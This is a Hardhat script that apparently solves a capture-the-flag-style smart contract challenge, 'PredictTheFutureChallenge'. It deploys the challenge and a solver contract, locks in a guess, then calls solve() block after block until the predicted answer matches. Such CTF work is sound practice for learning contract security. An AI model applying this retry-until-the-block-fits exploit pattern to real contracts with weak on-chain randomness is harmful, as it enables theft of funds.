import { ethers } from "hardhat";

async function main() {
  const amount = ethers.parseEther("1");

  // deploy challenge contract
  const predictTheFutureChallenge = await ethers.getContractFactory(
    "PredictTheFutureChallenge"
  );
  const contract = await predictTheFutureChallenge.deploy({ value: amount });
  await contract.waitForDeployment();

  // deploy solver contract
  const predictTheFutureSolver = await ethers.getContractFactory(
    "PredictTheFutureSolver"
  );
  const solver = await predictTheFutureSolver.deploy(contract.target);
  await solver.waitForDeployment();

  // guess predetermined number
  const guess = await solver.lockInGuess({ value: amount });
  await guess.wait();

  // run until the answer is the same as the solver contract predetermined number
  while (!(await contract.isComplete())) {
    try {
      const solve = await solver.solve({ gasLimit: 1000000 });
      await solve.wait();
    } catch (err) {
      console.log(`attack failed`);
    }
    const blockNumber = await ethers.provider.getBlockNumber();
    console.log(`Tried block number: ${blockNumber}`);
  }

  const isComplete = await contract.isComplete();

  console.log("isComplete:", isComplete);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
